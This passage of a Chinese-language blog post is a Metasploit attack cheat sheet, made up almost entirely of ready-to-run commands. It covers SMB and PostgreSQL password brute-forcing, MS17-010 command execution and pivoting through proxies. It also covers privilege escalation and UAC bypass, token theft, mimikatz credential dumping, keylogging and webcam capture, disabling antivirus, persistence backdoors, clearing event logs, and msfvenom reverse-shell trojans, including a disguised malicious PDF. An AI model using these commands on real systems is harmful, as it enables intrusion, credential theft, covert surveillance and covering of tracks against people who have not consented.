<h4 id="配置postgresql"><a href="#配置postgresql" class="headerlink" title="配置postgresql"></a>配置postgresql</h4><p>修改 posgres 系统用户密码 </p>
<p>echo “postgres:hacker123456!” | chpasswd </p>
<p>修改 postgresql 数据库中默认用户 postgres的密码 </p>
<p>su postgres 进入 postgres </p>
<p>psql 连接 psql </p>
<p>/password postgres 修改密码 hacker123456+ </p>
<p>/q 退出 </p>
<p>exit 返回</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113440959.png" srcset="/img/loading.gif" lazyload alt="image-20220204113440959"></p>
<h4 id="快捷连接"><a href="#快捷连接" class="headerlink" title="快捷连接"></a>快捷连接</h4><p>查看当前数据库连接状态 ： db_status</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113527755.png" srcset="/img/loading.gif" lazyload alt="image-20220204113527755"></p>
<p>使用 msfconsole 的资源加载功能。 </p>
<ol>
<li>把 db_connect postgres:<a href="mailto:&#x68;&#x61;&#99;&#x6b;&#101;&#114;&#49;&#50;&#51;&#52;&#x35;&#54;&#43;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#48;&#x2e;&#x31;">&#x68;&#x61;&#99;&#x6b;&#101;&#114;&#49;&#50;&#51;&#52;&#x35;&#54;&#43;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#48;&#x2e;&#x31;</a>/msfdb 保存为文件件 connection.rc </li>
<li>msfconsole -r connection.rc hacker123456+ 是密码</li>
</ol>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113602545.png" srcset="/img/loading.gif" lazyload alt="image-20220204113602545"></p>
<p>已经连接到数据库服务里了</p>
<h4 id="爆破-postgresql-密码然后保存到数据库"><a href="#爆破-postgresql-密码然后保存到数据库" class="headerlink" title="爆破 postgresql 密码然后保存到数据库"></a>爆破 postgresql 密码然后保存到数据库</h4><p>使用这个模块 ： auxiliary/scanner/postgres/postgres_login </p>
<p>use auxiliary/scanner/postgres/postgres_login </p>
<p>set rhosts 127.0.0.1 set username postgres </p>
<p>set password hacker123456+ 这里密码可以加载一个 txt 文件来爆破 </p>
<p>设置完数据库名，账号，密码后直接 run</p>
<p>爆破成功后，数据库就会有记录了：creds</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113800776.png" srcset="/img/loading.gif" lazyload alt="image-20220204113800776"></p>
<h3 id="十四、msf之内网渗透之smb密码爆破-远程命令执行"><a href="#十四、msf之内网渗透之smb密码爆破-远程命令执行" class="headerlink" title="十四、msf之内网渗透之smb密码爆破+远程命令执行"></a>十四、msf之内网渗透之smb密码爆破+远程命令执行</h3><h4 id="爆破SMB"><a href="#爆破SMB" class="headerlink" title="爆破SMB"></a>爆破SMB</h4><p>SMB 对应的端口是 445</p>
<p>使用的是这个模块 ： auxiliary/scanner/portscan/tcp</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204223548792.png" srcset="/img/loading.gif" lazyload alt="image-20220204223548792"></p>
<p>爆破 SMB ，爆破这个 IP 192.168.136.130:445</p>
<p><strong>use auxiliary/scanner/smb/smb_login</strong></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204224123882.png" srcset="/img/loading.gif" lazyload alt="image-20220204224123882"></p>
<p>一般来说 就设置 rhost、用户名、密码，用户名和密码可以在当前工作目录下生成一个 字典文件，然后用 file:/root/dic.txt 指定一个字典文件</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204224141621.png" srcset="/img/loading.gif" lazyload alt="image-20220204224141621"></p>
<h4 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h4><p>有了 IP 192.168.1.14 , 账号 admin ， 密码 123456 之后，就可以使用 msf 的模块来 造成远程命令执行：</p>
<p>使用这个模块 auxiliary/admin/smb/ms17_010_command</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204224856263.png" srcset="/img/loading.gif" lazyload alt="image-20220204224856263"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204224910613.png" srcset="/img/loading.gif" lazyload alt="image-20220204224910613"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204230110452.png" srcset="/img/loading.gif" lazyload alt="image-20220204230110452"></p>
<h3 id="十五、msf之内网渗透之反向Socks-代理"><a href="#十五、msf之内网渗透之反向Socks-代理" class="headerlink" title="十五、msf之内网渗透之反向Socks 代理"></a>十五、msf之内网渗透之反向Socks 代理</h3><h4 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h4><p>采用 socks 协议的代理服务器就是 socks 服务器，是一种通用的代理服务器，Socks 是个电路级的底层网关。 Socks 代理与应用层、HTTP层代理不同，Socks 代理只是简单的传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。 所以，Socks代理比其他应用层代理要快的多。 Socks 不支持 ICMP 、Ping 和 ARP 协议</p>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>目标内网有多台机器，网速较好，想要便捷访问目标任意服务</p>
<h4 id="反向Socks代理"><a href="#反向Socks代理" class="headerlink" title="反向Socks代理"></a>反向Socks代理</h4><p>Socks 代理 MSF 有这些模块</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233337071.png" srcset="/img/loading.gif" lazyload alt="image-20220204233337071"></p>
<p>我们先使用 1 auxiliary/server/socks4a</p>
<p>这是需要设置的一些参数：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233402470.png" srcset="/img/loading.gif" lazyload alt="image-20220204233402470"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233421219.png" srcset="/img/loading.gif" lazyload alt="image-20220204233421219"></p>
<p>添加路由： run autoroute -s 192.168.136.130/24 192.168.136.130 是目标的 IP</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233436421.png" srcset="/img/loading.gif" lazyload alt="image-20220204233436421"></p>
<h4 id="安装配置-proxychains"><a href="#安装配置-proxychains" class="headerlink" title="安装配置 proxychains"></a>安装配置 proxychains</h4><p><strong>apt-get install proxychains</strong></p>
<p>配置 proxychains ： /etc/proxychains.conf 在末尾，吧端口更改为刚刚设置监听的 1080 端口</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233530380.png" srcset="/img/loading.gif" lazyload alt="image-20220204233530380"></p>
<p>这里的ip  端口 要和前面设置的一样</p>
<h4 id="使用-proxychains"><a href="#使用-proxychains" class="headerlink" title="使用 proxychains"></a>使用 proxychains</h4><p>proxychains 对 目标机（192.168.136.130） 扫描内网端口 TCP连接扫描 </p>
<p>proxychains nmap -Pn -sT -P 80,445,1433,3306,3389, 192.168.136.130</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233616150.png" srcset="/img/loading.gif" lazyload alt="image-20220204233616150"></p>
<p>这边扫描出结果，开放了，以上端口，如是开放了 80 端口， 那么就可以直接访问了</p>
<h3 id="十六、msf之设置session永久不掉线"><a href="#十六、msf之设置session永久不掉线" class="headerlink" title="十六、msf之设置session永久不掉线"></a>十六、msf之设置session永久不掉线</h3><h4 id="保持监听持续"><a href="#保持监听持续" class="headerlink" title="保持监听持续"></a>保持监听持续</h4><p><em># 可以在接收到seesion后继续监听端口，保持侦听。</em> </p>
<p>msf exploit(multi/handler) &gt; set ExitOnSession false </p>
<h4 id="防止session超时退出"><a href="#防止session超时退出" class="headerlink" title="防止session超时退出"></a>防止session超时退出</h4><p><em># 默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</em> </p>
<p>msf5 exploit(multi/handler) &gt; set SessionCommunicationTimeout 0 </p>
<p><em># 默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</em> </p>
<p>msf5 exploit(multi/handler) &gt; set SessionExpirationTimeout 0 </p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Dearggae/article/details/106614064">https://blog.csdn.net/Dearggae/article/details/106614064</a></p>
<h3 id="十七、msf之search模块使用"><a href="#十七、msf之search模块使用" class="headerlink" title="十七、msf之search模块使用"></a>十七、msf之search模块使用</h3><p>可以使用内置的关键字系统进一步优化您的搜索。命令：<code>help search</code></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234209811.png" srcset="/img/loading.gif" lazyload alt="image-20220204234209811"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234229962.png" srcset="/img/loading.gif" lazyload alt="image-20220204234229962"></p>
<p>要使用描述性名称进行搜索，请使用name关键字。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234304540.png" srcset="/img/loading.gif" lazyload alt="image-20220204234304540"></p>
<p>您可以使用platform将搜索范围缩小到影响特定platform（平台）的模块。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234400441.png" srcset="/img/loading.gif" lazyload alt="image-20220204234400441"></p>
<p>使用该type可以按模块类型进行过滤，如auxiliary（辅助），post（提交），exploit（利用）等。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234504282.png" srcset="/img/loading.gif" lazyload alt="image-20220204234504282"></p>
<p>使用author关键字搜索可让您搜索您最喜爱的作者的模块</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234540021.png" srcset="/img/loading.gif" lazyload alt="image-20220204234540021"></p>
<p>当然，<code>search</code>命令还可以在拿到一定权限时，可以在受害者机器内搜索想要的信息</p>
<p>search -h</p>
<p>meterpreter &gt; search -h<br>Usage: search [-d dir] [-r recurse] -f pattern<br>Search for files.<br>OPTIONS:<br>-d 开始从中搜索的 目录/驱动器。 留空以搜索所有驱动器。 （默认：）<br>-f 要搜索的文件模式glob。 （例如* secret * .doc？）<br>-h 帮助横幅。<br>-r 递归搜索子目录。 （默认：true）</p>
<h3 id="十八、msf之常用命令"><a href="#十八、msf之常用命令" class="headerlink" title="十八、msf之常用命令"></a>十八、msf之常用命令</h3><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><p>加载模块 use name </p>
<p>查看网络配置 ifconfig </p>
<p>获取进程列表 ps </p>
<p>查看所有exploit show exploits </p>
<p>查看所有payload show payloads </p>
<p>查看所有auxiliary show auxiliary </p>
<p>展示模块详细信息 info </p>
<p>查找模块 search name </p>
<p>查看当前运行的模块 jobs </p>
<p>重启目标机器 reboot </p>
<p>关闭目标机器 shutdown </p>
<p>获取交互shell shell </p>
<p>当前meterpreter到后台 background </p>
<p>离开msf quit</p>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>portfwd add -l 6666 -p 3389 -r 192.168.1.2</p>
<p>常用参数： -l：本地监听端口 -r：内网目标的ip -p：内网目标的端口</p>
<h4 id="设置Socks代理"><a href="#设置Socks代理" class="headerlink" title="设置Socks代理"></a>设置Socks代理</h4><ul>
<li>Socks4a代理</li>
<li>use auxiliary/server/socks4a </li>
<li>set srvhost 127.0.0.1 </li>
<li>set srvport 1080 </li>
<li>run</li>
</ul>
<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><ul>
<li>获取网段信息 </li>
<li>run get_local_subnets </li>
<li>查看帮助 </li>
<li>run autoroute –h </li>
<li>添加到目标环境网络 </li>
<li>run autoroute -s 192.168.0.1/24 </li>
<li>打印添加的路由 </li>
<li>run autoroute –p </li>
<li>删除路由 </li>
<li>run autoroute -d -s 192.168.0.1/24</li>
</ul>
<h4 id="execute执行文件"><a href="#execute执行文件" class="headerlink" title="execute执行文件"></a>execute执行文件</h4><p>在目标机中执行文件</p>
<p>execute </p>
<p>创建新进程cmd.exe，-H不可见，-i交互 </p>
<p>execute -H -i -f cmd.exe</p>
<p>-f：指定可执行文件 </p>
<p>-H：创建一个隐藏进程 </p>
<p>-a：传递给命令的参数 </p>
<p>-i：跟进程进行交互 </p>
<p>-m：从内存中执行 </p>
<p>-t： 使用当前伪造的线程令牌运行进程 </p>
<p>-s： 在给定会话中执行进程</p>
<h4 id="migrate转移进程"><a href="#migrate转移进程" class="headerlink" title="migrate转移进程"></a>migrate转移进程</h4><p>获取当前进程PID getpid </p>
<p>获取进程列表 ps </p>
<p>转移进程 migrate PID </p>
<p>杀死进程 kill PID </p>
<p>自动进程迁移 run post/windows/manage/migrate </p>
<p>监听设置自动转移进程 set autorunscript migrate -f</p>
<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>使用模块 use incognito </p>
<p>查看可用token list_tokens -u </p>
<p>假冒SYSTEM权限 impersonate_token ‘NT AUTHORITY/SYSTEM’ </p>
<p>利用假冒身份执行命令 execute -f cmd.exe -i –t </p>
<p>或者直接shell即可 </p>
<p>返回原始权限 rev2self</p>
<h4 id="提权相关"><a href="#提权相关" class="headerlink" title="提权相关"></a>提权相关</h4><p>加载特权提升扩展模块 use priv </p>
<p>获取更多的特权 getprivs </p>
<p>查看补丁信息 run post/windows/gather/enum_patches </p>
<p>可利用exp提权检测 use post/multi/recon/local_exploit_suggester </p>
<p>系统服务权限配置错误 use exploit/windows/local/service_permissions </p>
<p>注册表键配置错误提取 use exploit/windows/local/always_install_elevated </p>
<p>可信任服务路径 use exploit/windows/local/trusted_service_path</p>
<h4 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h4><p>use exploit/windows/local/bypassuac </p>
<p>use exploit/windows/local/bypassuac_injection </p>
<p>use windows/local/bypassuac_vbs </p>
<p>use windows/local/ask</p>
<h4 id="键盘鼠标设置"><a href="#键盘鼠标设置" class="headerlink" title="键盘鼠标设置"></a>键盘鼠标设置</h4><p>禁用鼠标 uictl disable mouse </p>
<p>禁用键盘 uictl disable keyboard </p>
<p>启用鼠标 uictl enable mouse </p>
<p>启用键盘 uictl enable keyboard </p>
<p>键盘记录 </p>
<p>#开始键盘记录 </p>
<p>keyscan_start </p>
<p>#导出记录数据 </p>
<p>keyscan_dump </p>
<p>#结束键盘记录 </p>
<p>keyscan_stop</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>查看当前目录 pwd getwd </p>
<p>查看目标主机信息 sysinfo </p>
<p>检查目标机器闲置时间 idletime </p>
<p>获取代理信息 </p>
<p>getproxy </p>
<p>查看目标主机是否运行在虚拟机上 </p>
<p>run checkvm run post/windows/gather/checkvm </p>
<p>获取主机安装软件、补丁 </p>
<p>run post/windows/gather/enum_applications </p>
<p>获取目标主机环境变量 </p>
<p>run post/multi/gather/env </p>
<p>获取IE缓存 </p>
<p>run post/windows/gather/enum_ie </p>
<p>获取Chrome缓存 </p>
<p>run post/windows/gather/enum_chrome </p>
<p>获取Firefox缓存 </p>
<p>run post/windows/gather/enum_firefox </p>
<p>列举当前登录的用户 </p>
<p>run post/windows/gather/enum_logged_on_users </p>
<p>查找域控 </p>
<p>run post/windows/gather/enum_domain </p>
<p>Windows凭证搜索 </p>
<p>run post/windows/gather/enum_unattend </p>
<p>获取办公文档</p>
<p>run post/windows/gather/dumplinks </p>
<p>获取目标常见信息并保存到本地 run scraper </p>
<p>屏幕截图 </p>
<p>screenshot</p>
<h4 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h4><p>抓取自动登录的用户名和密码 </p>
<p>run post/windows/gather/credentials/windows_autologin </p>
<p>hashdump </p>
<p>run post/windows/gather/smart_hashdump</p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>老版</p>
<p>加载 load mimikatz </p>
<p>获取hash值 msv </p>
<p>获取明文 Kerberos </p>
<p>获取系统账户信息 wdigest</p>
<p>新版</p>
<p>加载kiwi模块：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">load kiwi<br></code></pre></td></tr></table></figure>

<p>列举系统中的明文密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">creds_all<br></code></pre></td></tr></table></figure>

<p>creds_all：             #列举所有凭据<br>creds_kerberos：        #列举所有kerberos凭据<br>creds_msv：             #列举所有msv凭据<br>creds_ssp：             #列举所有ssp凭据<br>creds_tspkg：           #列举所有tspkg凭据<br>creds_wdigest：         #列举所有wdigest凭据<br>dcsync：                #通过DCSync检索用户帐户信息<br>dcsync_ntlm：           #通过DCSync检索用户帐户NTLM散列、SID和RID<br>golden_ticket_create：  #创建黄金票据<br>kerberos_ticket_list：  #列举kerberos票据<br>kerberos_ticket_purge： #清除kerberos票据<br>kerberos_ticket_use：   #使用kerberos票据<br>kiwi_cmd：              #执行mimikatz的命令，后面接mimikatz.exe的命令<br>lsa_dump_sam：          #dump出lsa的SAM<br>lsa_dump_secrets：      #dump出lsa的密文<br>password_change：       #修改密码<br>wifi_list：             #列出当前用户的wifi配置文件<br>wifi_list_shared：      #列出共享wifi配置文件/编码</p>
<p><strong>kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令:</strong></p>
<p>kiwi_cmd sekurlsa::logonpasswords</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220205000038842.png" srcset="/img/loading.gif" lazyload alt="image-20220205000038842"></p>
<h4 id="获取域散列值"><a href="#获取域散列值" class="headerlink" title="获取域散列值"></a>获取域散列值</h4><p>/#使用psexec_ntdsgrab模块 </p>
<p>use auxiliary/admin/smb/psexec_ntdsgrab </p>
<p>set RHOST set SMBDomain </p>
<p>set SMBUser </p>
<p>set SMBPass </p>
<p>#基于meterpreter会话 </p>
<p>use windows/gather/credentials/domain_hashdump </p>
<p>set session ID</p>
<h4 id="流量抓取"><a href="#流量抓取" class="headerlink" title="流量抓取"></a>流量抓取</h4><p>查看网卡信息 </p>
<p>run packetrecorder -L </p>
<p>查看流量 </p>
<p>run packetrecorder -i &lt;网卡ID&gt;</p>
<h4 id="端口扫描、主机发现"><a href="#端口扫描、主机发现" class="headerlink" title="端口扫描、主机发现"></a>端口扫描、主机发现</h4><p>使用arp发现主机 </p>
<p>run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24 </p>
<p>扫描tcp端口 </p>
<p>run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</p>
<h4 id="防火墙、杀软"><a href="#防火墙、杀软" class="headerlink" title="防火墙、杀软"></a>防火墙、杀软</h4><p>关闭杀软 run killav </p>
<p>查看防火墙状态 run getcountermeasure</p>
<p>在shell中使用 </p>
<p>netsh firewall show opmode</p>
<h4 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h4><p>加载脚本模块 </p>
<p>powershell_import /root/Desktop/HostRecon.ps1 </p>
<p>执行加载的脚本 </p>
<p>powershell_execute Invoke-HostRecon</p>
<h4 id="Hash传递"><a href="#Hash传递" class="headerlink" title="Hash传递"></a>Hash传递</h4><p>use exploit/windows/smb/psexec</p>
<h4 id="摄像头、屏幕"><a href="#摄像头、屏幕" class="headerlink" title="摄像头、屏幕"></a>摄像头、屏幕</h4><p>查看摄像头信息 webcam_list </p>
<p>使用摄像头拍照 webcam_snap </p>
<p>屏幕监视 run vnc</p>
<h4 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h4><p>开启远程桌面 </p>
<p>run post/windows/manage/enable_rdp </p>
<p>添加用户 </p>
<p>run post/windows/manage/enable_rdp USERNAME=gugugu PASSWORD=Root123456789 </p>
<p>将3389端口转发到6662端口 </p>
<p>run post/windows/manage/enable_rdp FORWARD=true LPORT=6662</p>
<h4 id="cmdshell升级"><a href="#cmdshell升级" class="headerlink" title="cmdshell升级"></a>cmdshell升级</h4><p>查看全部会话 sessions </p>
<p>选择会话1 sessions 1 </p>
<p>升级meterpreter sessions -u 会话id</p>
<h4 id="持久化控制后门"><a href="#持久化控制后门" class="headerlink" title="持久化控制后门"></a>持久化控制后门</h4><p>run persistence -X -i 50 -p 4444 -r 192.168.1.7</p>
<p>use exploit/multi/handler </p>
<p>set payload windows/meterpreter/reverse_tcp </p>
<p>set LHOST 192.168.109.137 </p>
<p>set LPORT 4444 </p>
<p>exploit</p>
<h4 id="针对linux平台"><a href="#针对linux平台" class="headerlink" title="针对linux平台"></a>针对linux平台</h4><p>目标主机保存的ssh身份验证信息 </p>
<p>run post/multi/gather/ssh_creds</p>
<h4 id="擦屁股、清痕迹"><a href="#擦屁股、清痕迹" class="headerlink" title="擦屁股、清痕迹"></a>擦屁股、清痕迹</h4><p>删除添加的账号 </p>
<p>C:/Windows/system32&gt; net user 添加的用户名 /del </p>
<p>删除日志 </p>
<p>clearev </p>
<p>关闭所有session连接 </p>
<p>sessions -K </p>
<p>事件日志</p>
<p>查看事件日志 </p>
<p>run event_manager -i </p>
<p>清除事件日志 </p>
<p>run event_manager -c</p>
<h4 id="msf生成木马教程"><a href="#msf生成木马教程" class="headerlink" title="msf生成木马教程"></a>msf生成木马教程</h4><h5 id="生成木马命令：msfvenom-1"><a href="#生成木马命令：msfvenom-1" class="headerlink" title="生成木马命令：msfvenom"></a>生成木马命令：<code>msfvenom</code></h5><p>msfcenom详细语法<br>-e, –encoder [encoder] 指定需要使用的encoder（编码器）<br>-a, –arch &lt; architecture&gt; 指定payload的目标架构<br>–platform &lt; platform&gt; 指定payload的目标平台<br>-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度<br>-b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;/x00/xff&amp; #039;<br>-i, –iterations &lt; count&gt; 指定payload的编码次数<br>-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件<br>-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板<br>-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行<br>–payload-options 列举payload的标准选项<br>-o, –out &lt; path&gt; 保存payload<br>-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式<br>–shellest 最小化生成payload<br>-h, –help 查看帮助选项<br>–help-formats 查看msf支持的输出格式列表</p>
<h5 id="生成木马语句-1"><a href="#生成木马语句-1" class="headerlink" title="生成木马语句"></a>生成木马语句</h5><p>二进制<br>linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</p>
<p>windows:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe</p>
<p>mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</p>
<p>web<br>php:msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ’ | tr -d ‘/n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
<p>asp:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</p>
<p>jap:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</p>
<p>war:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</p>
<p>脚本<br>python:msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py</p>
<p>bash:msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh</p>
<p>perl:msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl</p>
<p>基于pdf的shellcode<br>use exploit/windows/fileformat/adobe_utilprintf<br>msf5 exploit(adobe_utilprintf)&gt;set FILENAME BestComputers-UpgradeInstructions.pdfset</p>
<p>PAYLOAD windows/meterpreter/reverse_tcp<br>其他的就自己填就好了</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46789316/article/details/112135904">https://blog.csdn.net/weixin_46789316/article/details/112135904</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hackzkaq/article/details/120825347">https://blog.csdn.net/hackzkaq/article/details/120825347</a></p>
<p>渗透攻击红队msf系列</p>
<p>pdf在：<a target="_blank" rel="noopener" href="https://github.com/txluck/MSF_operation_guide">https://github.com/txluck/MSF_operation_guide</a></p>
<p>有错的地方 不足的地方请师傅们指出：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/txluck/MSF_operation_guide/issues">https://github.com/txluck/MSF_operation_guide/issues</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/MSF/">MSF</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/MSF/">MSF</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/02/10/%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E4%B8%8A%E7%BA%BF/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">溢出提权上线</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/">
                        <span class="hidden-mobile">gitpush失败</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
